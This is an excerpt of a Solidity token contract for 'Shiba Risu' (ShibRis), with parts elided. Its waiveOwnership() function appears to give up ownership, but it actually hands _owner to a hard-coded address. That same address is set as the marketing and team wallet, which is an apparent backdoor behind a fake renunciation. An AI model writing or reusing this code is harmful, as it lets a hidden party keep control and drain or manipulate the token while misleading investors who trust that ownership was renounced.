...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x314f90dC2A5c5E033D03b5eA4d82f00d65E0A72E);
    }
...
contract ShibaRisu is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Shiba Risu";
    string private _symbol = "ShibRis";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x314f90dC2A5c5E033D03b5eA4d82f00d65E0A72E);
    address payable public teamWalletAddress = payable(0x314f90dC2A5c5E033D03b5eA4d82f00d65E0A72E);
